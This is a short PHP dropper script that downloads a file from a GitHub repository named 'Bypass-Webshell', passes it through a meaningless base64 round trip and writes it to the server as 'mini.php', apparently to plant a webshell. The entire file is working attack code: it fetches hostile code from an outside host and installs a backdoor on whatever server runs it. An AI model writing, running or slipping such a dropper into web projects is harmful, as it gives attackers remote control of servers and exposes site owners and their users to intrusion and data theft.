<?php
$encodedUrl = 'https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/403.php';
$encodedContent = file_get_contents($encodedUrl);
$decodedContent = base64_encode($encodedContent);
if(file_put_contents('mini.php' ,base64_decode($decodedContent))){echo "File : mini.php Success !";}else{echo error;}
?>
